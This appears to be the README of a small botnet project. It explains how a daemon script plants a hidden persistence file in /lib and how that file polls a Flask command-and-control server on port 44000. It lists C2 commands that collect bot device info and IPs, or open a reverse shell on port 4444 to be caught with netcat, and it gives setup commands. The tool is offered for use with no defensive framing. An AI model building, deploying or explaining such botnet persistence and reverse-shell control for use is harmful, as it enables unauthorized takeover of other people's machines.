# SmallBotnet

## Small Botnet Code

The `deamon.sh` script creates a daemon that starts every time the server is online. <br>
It also creates a file in `/lib` called `.smd.sh`, which is started by the daemon. <br>
The `.smd.sh` script then tries to connect to the HTTP server launched by `WebServerControler.py` on the default port 44000. <br>
The web server returns the command you selected in `WebServerControler.py`. <br> <br>
## Commands

`list_device_info` > Returns the device info of all bots in a `data.json` file. <br>
`list_device_ip` > Returns all IP addresses of the devices, also in a `data.json` file. <br>
`<device ip>` > The selected IP starts a reverse shell on port 4444. You can connect to it with `nc -lvnp 4444`. <br> <br>
## Example

`chmod +x deamon.sh` | `sudo ./deamon.sh <ip>` <br>
You can also specify the port after the IP, but then you need to change it in the web server code as well. By default, it is set to 44000. <br>
`python3 WebServerControler.py` <br>
Install the required imports: <br>
`
from flask import Flask, request  
import threading  
import time  
import logging  
`
